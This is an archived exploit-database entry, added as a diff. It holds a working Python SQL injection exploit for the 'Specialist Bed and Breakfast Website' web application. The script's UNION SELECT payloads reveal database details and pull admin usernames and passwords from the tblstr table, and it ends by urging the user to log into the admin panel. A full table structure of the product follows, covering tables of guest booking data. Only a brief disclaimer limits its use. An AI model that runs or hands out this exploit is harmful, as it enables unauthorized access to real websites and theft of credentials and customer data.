@@ -1,0 +1,411 @@
+id: 13088
+date: 07/03/2010
+title: Specialist Bed and Breakfast Website SQL Injection Exploit
+author: Valentin Hobel
+cves: 
+
+==========================================================
+Specialist Bed and Breakfast Website SQL Injection Exploit
+==========================================================
+
+
+#!/usr/bin/python
+
+# Specialist Bed and Breakfast Website SQL Injection Exploit 
+# by Valentin Hoebel (valentin@xenuser.org)
+# Version 1.0 (3rd July 2010)
+# ASCII FOR BREAKFAST
+
+# About the vulnerability:
+# ----------------------------------------------------------------------------
+# Read more here:
+# http://www.exploit-db.com/exploits/14144/
+# (Discovered by JaMbA)
+
+# About the exploit:
+# ----------------------------------------------------------------------------
+# This exploit tries to take advantage of a SQL injection
+# vulnerability JaMbA published on 30th June 2010.
+
+# FIND THE TABLE STRUCTURE OF THE VULNERABLE
+# PRODUCT AT THE END OF THIS FILE!
+
+# Features:
+# ----------------------------------------------------------------------------
+# - Check if provided URL is reachable
+# - Error handling for HTTP requests
+# - Display current database, MySQL user and the MySQL version
+# - Display the admin login data
+# - Easy to use (everything is simple and automated)
+# - User agent for HTTP requests
+
+# Usage example:
+# python bed_and_breakfast_sploit.py - u "http://target/site/pages.php?fid=0,1,472&pp_id=84"
+# Hint: You have to provide the URL with this pattern! 
+# (The vulnerable parameter pp_id has to be at the end of the URL.)
+
+# Feel free to use, modify, distribute and share this code as you like!
+# If you publish this exploit on your website, forum etc. please leave this
+# code and all comments untouched! Thanks!
+
+# This tool war written for educational purposes only. I am not responsible for any damage
+# you might cause using this tool. Know and respect your local laws!
+# Only use this tool on websites you are allowed to test :)
+
+# Greetz && THX
+# ----------------------------------------------------------------------------------
+# Greetz: cr4wl3r and /JosS
+# Greetz && THX to: Exploit DB team, hack0wn and packetstormsecurity.org
+# Thanks to JaMbA for finding this vulnerability!
+
+# A BIG "Thank you!" to all who publish their awesome Python
+# scripts online and help other ppl learning this language.
+
+# Power to the cows!
+
+import sys,  re,  urllib,  urllib2,  string
+from urllib2 import Request,  urlopen,  URLError,  HTTPError
+from urlparse import urlparse
+
+# Define the usage, the first thing a users sees if he/she starts the script without any parameter
+def print_usage():
+    print ""
+    print ""
+    print "~~~~~~~~~~~~~~~~~,(^_^),~~~~~~~~~~~~~~~~~~~~~~~~~"
+    print "Specialist Bed and Breakfast Website SQL Injection Exploit"
+    print "by Valentin Hoebel (valentin@xenuser.org)"
+    print ""
+    print "Version 1.0 (3rd July 2010)   ^__^"
+    print "                              (oo)\________"
+    print "                              (__)\        )\/\ "
+    print "                                  ||----w |"
+    print "Power to teh cows!                ||     ||"
+    print "~~~~~~~~~~~~~~~~~,(^_^),~~~~~~~~~~~~~~~~~~~~~~~~~"
+    print ""
+    print "[!] Use parameter --help for help!"
+    print ""
+    print ""
+    return
+
+def print_help():
+    print ""
+    print ""
+    print "~~~~~~~~~~~~~~~~~,(^_^),~~~~~~~~~~~~~~~~~~~~~~~~~"
+    print "Specialist Bed and Breakfast Website SQL Injection Exploit"
+    print "by Valentin Hoebel (valentin@xenuser.org)"
+    print ""
+    print "Version 1.0 (3rd July 2010)   ^__^"
+    print "                              (oo)\________"
+    print "                              (__)\        )\/\ "
+    print "                                  ||----w |"
+    print "Power to teh cows!                ||     ||"
+    print "~~~~~~~~~~~~~~~~~,(^_^),~~~~~~~~~~~~~~~~~~~~~~~~~"
+    print ""
+    print "This exploit takes advantage of the SQL injection vulnerability"
+    print "JaMbA published on 30th June 2010."
+    print ""
+    print "Usage example:"
+    print "python bed_and_breakfast_sploit.py -ue \"http://target/site/pages.php?fid=0,1,472&pp_id=84\""
+    print ""
+    print "Options:"
+    print " -u <URL>       (tries to display some useful information)"
+    print " -ue <URL>      (tries to give you the admin login data)"
+    print " --help         (displays this text)"
+    print ""
+    print "Features:"
+    print " - Check if provided URL is reachable"
+    print " - Error handling for HTTP requests"
+    print " - Display current database, MySQL user and the MySQL version"
+    print " - Display the admin login data"
+    print " - Easy to use (everything is simple and automated)"
+    print " - User agent for HTTP requests"
+    print ""
+    print "Hint: You have to provide the URL with this pattern! "
+    print "(The vulnerable parameter pp_id has to be at the end of the URL.)"
+    print ""
+    print "Disclaimer:"
+    print "Only use this tool to check websites you are"
+    print "allowed to test (e.g. for penetration testing)."
+    print "Never use this tool on foreign websites!"
+    print "Know and respect your local laws!"
+    print "I am not responsible if you cause any damage or"
+    print "run into trouble."
+    print ""
+    print "This tool was written for educational purposes only."
+    print ""
+    print ""
+    return
+
+def print_banner():
+    print ""
+    print ""
+    print "~~~~~~~~~~~~~~~~~,(^_^),~~~~~~~~~~~~~~~~~~~~~~~~~"
+    print "Specialist Bed and Breakfast Website SQL Injection Exploit"
+    print "by Valentin Hoebel (valentin@xenuser.org)"
+    print ""
+    print "Version 1.0 (3rd July 2010)   ^__^"
+    print "                              (oo)\________"
+    print "                              (__)\        )\/\ "
+    print "                                  ||----w |"
+    print "Power to teh cows!                ||     ||"
+    print "~~~~~~~~~~~~~~~~~,(^_^),~~~~~~~~~~~~~~~~~~~~~~~~~"
+    return
+
+def exploit_url_default(provided_url):
+    # Define injection strings
+    injection_string_information = "+AND+1=2+UNION+SELECT+1,2,3,4,concat_ws(0x3b,0x503077337220743020743368206330777321,user(),database(),version(),0x503077337220743020743368206330777321)--"
+    
+    # Craft the URL which is about to be exploited
+    exploit_information = provided_url+injection_string_information
+    
+    # Define User-Agent variable, change it if you like!
+    user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)"    
+
+    # Adding the User-Agent to the HTTP request (via GET) 
+    request_URL = urllib2.Request(exploit_information)
+    request_URL.add_header("User-Agent",  user_agent)
+    
+    # Starting the request
+    print "[i] Checking if a connection can be established..."
+    try:
+        http_request_for_call = urllib2.urlopen(request_URL)
+    except HTTPError,  e:
+        print "[!] The connection could not be established."
+        print "[!] Error code: ",  e.code
+        print "[!] Exiting now!"
+        print ""
+        print ""
+        sys.exit(1)
+    except URLError,  e:
+        print "[!] The connection could not be established."
+        print "[!] Reason: ",  e.reason
+        print "[!] Exiting now!"
+        print ""
+        print ""
+        sys.exit(1)
+    else:
+        print "[i] Connected to target! URL seems to be valid."
+
+    # Storing the response (source code of called website)
+    html = http_request_for_call.read()
+
+    # Now extract the interesting information
+    print ""
+    print "[i] Moving on now."
+    get_secret_data = string.find(html,  "P0w3r t0 t3h c0ws!")
+
+    # If  the target is not vulnerable exit
+    if get_secret_data == -1:
+        print "[!] Exploitation failed. Maybe the target isn't vulnerable?"
+        print "[!] Remember to provide the URL in a correct way!"
+        print "[!] Exiting now!"
+        print ""
+        print ""
+        sys.exit(1)
+    else:
+        print "[i] Trying to display some basic information."
+        print ""
+    
+    get_secret_data += 18
+    new_html4= html[get_secret_data :]
+    new_get_secret_data4 = string.find(new_html4,  "P0w3r t0 t3h c0ws!")
+    new_html_5 = new_html4[:new_get_secret_data4]
+            
+    # Data was received, now format and display it
+    formatted_output = str.split(new_html_5,  ";")
+    print "[+] MySQL Database User: ",  formatted_output[1:2]
+    print "[+] MySQL Database: ",  formatted_output[2:3]
+    print "[+] MySQL Version: ",  formatted_output[3:4]
+    
+    print ""
+    print "[i] That's it! Bye!"
+    print ""
+    print ""
+    return
+    # End of default exploitation function
+    
+def exploit_url_user(provided_url):
+    # Define injection strings
+    injection_string_user = "+AND+1=2+UNION+SELECT+1,2,concat_ws(0x3b,0x503077337220743020743368206330777321,uname,pword,0x503077337220743020743368206330777321),concat_ws(0x3b,0x503077337220743020743368206330777321,uname,pword,0x503077337220743020743368206330777321),concat_ws(0x3b,0x503077337220743020743368206330777321,uname,pword,0x503077337220743020743368206330777321)+FROM+tblstr+Limit+1,1--"
+    
+    # Craft the URL which is about to be exploited
+    exploit_information = provided_url+injection_string_user
+    
+    # Define User-Agent variable, change it if you like!
+    user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)"    
+
+    # Adding the User-Agent to the HTTP request (via GET) 
+    request_URL = urllib2.Request(exploit_information)
+    request_URL.add_header("User-Agent",  user_agent)
+    
+    # Starting the request
+    print "[i] Checking if a connection can be established..."
+    try:
+        http_request_for_call = urllib2.urlopen(request_URL)
+    except HTTPError,  e:
+        print "[!] The connection could not be established."
+        print "[!] Error code: ",  e.code
+        print "[!] Exiting now!"
+        print ""
+        print ""
+        sys.exit(1)
+    except URLError,  e:
+        print "[!] The connection could not be established."
+        print "[!] Reason: ",  e.reason
+        print "[!] Exiting now!"
+        print ""
+        print ""
+        sys.exit(1)
+    else:
+        print "[i] Connected to target! URL seems to be valid."
+
+    # Storing the response (source code of called website)
+    html = http_request_for_call.read()
+
+    # Now extract the interesting information
+    print ""
+    print "[i] Moving on now."
+    get_secret_data = string.find(html,  "P0w3r t0 t3h c0ws!")
+
+    # If  the target is not vulnerable exit
+    if get_secret_data == -1:
+        print "[!] Exploitation failed. Maybe the target isn't vulnerable?"
+        print "[!] Remember to provide the URL in a correct way!"
+        print "[!] Exiting now!"
+        print ""
+        print ""
+        sys.exit(1)
+    else:
+        print "[i] Trying to display the first user of the user table."
+        print ""
+    
+    get_secret_data += 18
+    new_html4= html[get_secret_data :]
+    new_get_secret_data4 = string.find(new_html4,  "P0w3r t0 t3h c0ws!")
+    new_html_5 = new_html4[:new_get_secret_data4]
+            
+    # Data was received, now format and display it
+    formatted_output = str.split(new_html_5,  ";")
+    print "[+] User: ",  formatted_output[1:2]
+    print "[+] Password: ",  formatted_output[2:3]
+    print "[i] Now find the admin panel and have fun! :)"
+    
+    print ""
+    print "[i] That's it! Bye!"
+    print ""
+    print ""
+    return
+    # End of user exploit function
+
+# Checking if argument was provided
+if len(sys.argv) <=1:
+    print_usage()
+    sys.exit(1)
+    
+for arg in sys.argv:
+    # Checking if help was called
+    if arg == "--help":
+        print_help()
+        sys.exit(1)
+    
+    # Checking if  an URL was provided and start the default exploit mode
+    if arg == "-u":
+        provided_url = sys.argv[2]
+        print_banner()
+        
+        # Calling the default exploit mode
+        exploit_url_default(provided_url)
+
+
+    # Checking if  an URL was provided and start the user exploit mode
+    if arg == "-ue":
+        provided_url = sys.argv[2]
+        print_banner()
+        
+        # Calling the user exploit mode
+        exploit_url_user(provided_url)
+
+### End of Sploit ###
+
+# Table structure of Specialist Bed and Breakfast Website
+
+# tblbook_rooms
+# br_id,br_name,br_num
+
+# tblbooked_full:
+# fullb_id,book_day,book_month,book_year,book_date
+
+# tblbookings:
+# bkid,from_date,to_date,num_nights,full_name,address,email,tel,num_people,spec_needs,br_name
+
+# tblcontact_detail:
+# cd_id,cf_id,nm1,in_type_f1,nm2,in_type_f2,nm3,in_type_f3,nm4,in_type_f4,nm5,in_type_f5,nm6,in_type_f6,nm7,in_type_f7,nm8,in_type_f8,nm9,in_type_f9,nm10,in_type_f10
+
+# tblcontact_detail_sel:
+# cds_id,cd_id,in_type_num,in_type_val
+
+# tblcontact_detail_text:
+# cdt_id,cf_id,cd_id,txt1,txt2,txt3,txt4,txt5,txt6,txt7,txt8,txt9,txt10
+
+# tblcontact_form:
+# cf_id,title,s_title,cf_desc,email,function_f
+
+# tblcounter:
+# cnid,timeid,thispage,thedate
+
+# tblcounter_tdays:
+# tdid,num_hits,num_views,thedate
+
+# tblcounter_tpages:
+# tpid,tp_hits,tp_page_name,tp_month,tp_year
+
+# tbldef_mtags:
+#dmid,pagetitle,metawords,metadesc
+
+# tblflags:
+# flag_id,flag_name,flag_value
+
+# tblhelp:
+# hp_id,hp_title,hp_desc
+
+# tblpage_pics:
+# pp_id,mid,pp_name,pp_title,pp_desc
+
+# tblpages:
+# mid,pid,mname,ptitle,pdesc,pimage,mpimage,mtitle,mwords,mdesc,fid,ord_f,realpage_f,last_change,live_f,wfg_id,cf_id,del_f,template_f,nomov_f,ptitle2,ptitle3,flip1,flip2,flip3
+
+# tblpages_live:
+# mid,pid,mname,ptitle,pdesc,pimage,mpimage,mtitle,mwords,mdesc,fid,ord_f,realpage_f,last_change,live_f,wfg_id,cf_id,del_f,template_f,nomov_f,ptitle2,ptitle3,flip1,flip2,flip3
+
+# tblpages_sm:
+# sm_mid,mid,mname,page_add,mtitle,mwords,mdesc,ord_f,realpage_f,live_f,del_f
+
+# tblsbc_sections:
+# ssec_id,sbc_id,sbc_section
+
+# tblstr:
+# trid,uname,pword,email,sbc_level,sbc_section
+
+# tblwfg:
+# wfg_id,wfg_name
+
+# tblwfgm_he:
+# crs_id,wfgm_id,val_f
+
+# tblwfgm_pages:
+# mid,wfgm_id,val_f
+
+# tblwfgm_ts:
+# tscc_id,wfgm_id,val_f
+
+# tblwfgmembers:
+# wfgm_id,wfgm_name,wfgm_email,wfg_id
+
+# tblxml_map:
+# urlid,loc,changefreq,lastmod,priority,mid,lastmod_date,crs_id,no_delete_f
+
+### EOF ###
+
+
+
+#  0day.today [2023-03-27]  #
